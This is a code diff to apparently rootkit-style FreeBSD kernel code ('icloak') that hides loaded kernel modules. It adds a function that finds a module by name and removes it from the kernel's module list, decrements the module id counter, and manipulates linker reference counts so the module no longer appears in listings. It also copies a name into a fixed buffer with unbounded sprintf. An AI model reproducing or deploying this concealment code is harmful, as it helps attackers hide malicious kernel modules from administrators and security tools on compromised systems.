@@ -10,12 +10,18 @@
 
 static struct linker_file *find_kld(const char *name);
 
+static struct module *find_mod(const char *name);
+
 int native_icloak_ko(const char *name) {
     struct linker_file *kld;
+    struct module *mp;
     int deleted = 0;
 
+    // INFO(Rafael): I find hold this giant lock is only necessary
+    //               in FreeBSD 6.0 or older (not so sure). However,
+    //               I will let it holding from 7 or newer.
     mtx_lock(&Giant);
-    sx_xlock(&kld_sx);
+    kld_lock
 
     (&linker_files)->tqh_first->refs--;
 
@@ -26,8 +32,20 @@ int native_icloak_ko(const char *name) {
         kld = NULL;
     }
 
-    sx_xunlock(&kld_sx);
+    kld_unlock
     mtx_unlock(&Giant);
+
+    sx_xlock(&modules_sx);
+
+    // WARN(Rafael): It will work only if the module name is the same of
+    //               the kernel object file.
+    if ((mp = find_mod(name)) != NULL) {
+        TAILQ_REMOVE(&modules, mp, link);
+        nextid--;
+        mp = NULL;
+    }
+
+    sx_xunlock(&modules_sx);
 
     return (deleted == 1) ? 0 : 1;
 }
@@ -38,7 +56,7 @@ int native_icloak_mk_ko_perm(const char *name, void **exit) {
     int error;
 
     mtx_lock(&Giant);
-    sx_xlock(&kld_sx);
+    kld_lock
 
     (&linker_files)->tqh_first->refs--;
 
@@ -58,7 +76,7 @@ int native_icloak_mk_ko_perm(const char *name, void **exit) {
 
     mp = NULL;
 
-    sx_xunlock(&kld_sx);
+    kld_unlock
     mtx_unlock(&Giant);
 
     return error;
@@ -70,7 +88,7 @@ int native_icloak_mk_ko_nonperm(const char *name, void *exit) {
     struct linker_file *kld;
 
     mtx_lock(&Giant);
-    sx_xlock(&kld_sx);
+    kld_lock
 
     (&linker_files)->tqh_first->refs--;
 
@@ -87,7 +105,7 @@ int native_icloak_mk_ko_nonperm(const char *name, void *exit) {
 
     mp = NULL;
 
-    sx_xunlock(&kld_sx);
+    kld_unlock
     mtx_unlock(&Giant);
 
     return error;
@@ -117,4 +135,34 @@ static struct linker_file *find_kld(const char *name) {
     }
 
     return NULL;
+}
+
+static struct module *find_mod(const char *name) {
+    struct module *mp;
+    char mod_name[255], *mn;
+
+    if (name == NULL) {
+        return NULL;
+    }
+
+    sprintf(mod_name, "%s", name);
+
+    if ((mn = strstr(mod_name, ".ko")) != NULL) {
+        *mn = 0;
+        mn = NULL;
+    }
+
+    TAILQ_FOREACH(mp, &modules, link) {
+        if (strcmp(mp->name, mod_name) == 0) {
+            goto find_mod_epilogue;
+        }
+    }
+
+    mp = NULL;
+
+find_mod_epilogue:
+
+    memset(mod_name, 0, sizeof(mod_name));
+
+    return mp;
 }
